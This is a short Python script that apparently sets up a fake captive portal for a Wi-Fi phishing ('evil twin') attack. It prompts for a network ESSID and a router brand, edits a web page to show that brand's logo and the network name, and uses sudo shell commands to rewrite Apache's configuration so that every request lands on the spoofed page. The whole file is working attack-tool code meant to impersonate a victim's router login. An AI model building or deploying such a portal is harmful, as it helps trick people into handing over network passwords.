import os

class Captive:
	def __init__(self):
		self.essid = ""
		self.manufacturer = ""

	def menu_essid(self):
		essid = input("Network ESSID: ")
		if essid != "":
			self.essid = essid
		else:
			self.menu_essid()

	def menu_manufacturer(self):
		print("\n1 - Tp Link")
		print("2 - D Link")
		print("3 - Intelbras")
		print("4 - HUAWEI")
		print("5 - XIAOMI\n")
		while True:
			manufacturer = input("Choose a manufacturer: ")
			if manufacturer == "1":
				self.manufacturer = "tplink"
				break
			elif manufacturer == "2":
				self.manufacturer = "dlink"
				break
			elif manufacturer == "3":
				self.manufacturer = "intelbras"
				break
			elif manufacturer == "4":
				self.manufacturer = "huawei"
				break
			elif manufacturer == "5":
				self.manufacturer = "xiaomi"
				break
			else:
				print("Invalid option")	


	def index(self):
		with open("/var/www/html/index.html", "r+") as indexxx:
			file = indexxx.readlines()
			for line in file:
				if line == file[13]: #replace manufacturer image
					file[13] = line.replace(line.split("/")[2].split(" ")[0].split(".")[0], self.manufacturer)
				elif line == file[14]: #replace essid
					file[14] = line.replace(line.split(" ")[22], self.essid)
			indexxx.seek(0)
			indexxx.truncate()
			indexxx.writelines(file)

	def apache_config(self):
		os.system("sudo a2enmod rewrite")
		os.system("sudo sed -i 's/AllowOverride None/AllowOverride all/' /etc/apache2/apache2.conf")
		os.system("echo 'RewriteEngine on' > /var/www/html/.htaccess")
		os.system("echo 'RewriteCond %{REQUEST_FILENAME} !-d' >> /var/www/html/.htaccess")
		os.system("echo 'RewriteCond %{REQUEST_FILENAME} !-f' >> /var/www/html/.htaccess")
		os.system("echo 'RewriteRule . index.html [L]' >> /var/www/html/.htaccess")
		os.system("chown -R www-data /var/www/html/")
		os.system("sudo systemctl restart apache2")


	def run(self):
		self.menu_essid()
		self.menu_manufacturer()
		self.index()
		self.apache_config()


if __name__ == "__main__":
	captive = Captive()
	captive.run()
